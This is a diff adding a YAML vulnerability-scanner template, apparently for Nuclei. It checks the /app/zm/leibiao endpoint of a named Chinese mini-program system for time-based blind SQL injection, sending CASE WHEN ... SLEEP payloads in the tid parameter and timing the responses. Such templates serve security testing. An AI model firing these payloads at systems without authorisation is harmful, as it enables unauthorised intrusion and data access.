@@ -1,0 +1,55 @@
+id: poc-yaml-zhishiwuai-leibiao-sqli
+
+info:
+  name: 知识吾爱纯净版小程序系统 leibiao SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 知识吾爱纯净版小程序系统
+
+variables:
+  t1: "{{rand_int(2,5)}}"
+  t2: "{{to_number(t1) + to_number(t1)}}"
+  t3: "{{to_number(t2) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /app/zm/leibiao HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        tid=(CASE WHEN (3711=3712) THEN SLEEP({{t1}}) ELSE 3711 END)
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"code\":\"0\""
+          - "已经没有了"
+
+  - raw:
+      - |
+        POST /app/zm/leibiao HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        tid=(CASE WHEN (3711=3711) THEN SLEEP({{t1}}) ELSE 3711 END)
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"code\":\"1\""
+      - type: dsl
+        dsl:
+          - '!contains(body, "<")'
+          - 'duration > to_number(t2)'
+          - 'duration < to_number(t3)'
